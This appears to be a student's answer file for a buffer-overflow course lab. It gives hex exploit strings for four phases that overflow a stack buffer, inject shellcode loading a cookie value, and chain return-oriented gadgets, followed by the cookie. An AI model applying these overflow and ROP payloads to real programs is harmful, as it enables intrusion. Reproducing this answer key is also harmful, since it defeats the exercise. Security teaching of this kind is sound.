//fase1
11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 
11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 
11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 
11 11 11 11 00 00 00 00 a6 1a 40 00

//fase 2
bf 3a 4e db 47 c3 11 11 11 11 11 11 11 11 11 11 
11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 
11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 
11 11 11 11 00 00 00 00 88 27 65 55 00 00 00 00
d2 1a 40 00 00 00 00 00


//fase 3
48 b8 34 37 64 62 34 65 33 61 48 89 45 f0 48 8d 
45 f0 48 89 c7 c3 11 11 11 11 11 11 11 11 11 11 
11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 
11 11 11 11 00 00 00 00 88 27 65 55 00 00 00 00
a6 1b 40 00 00 00 00 00

//fase 4
bf 3a 4e db 47 c3 11 11 11 11 11 11 11 11 11 11 
11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 
11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 
11 11 11 11 00 00 00 00 4d 1c 40 00 00 00 00 00
3a 4e db 47 00 00 00 00 3c 1c 40 00 00 00 00 00
d2 1a 40 00 00 00 00 00

//cookie
0x47db4e3a
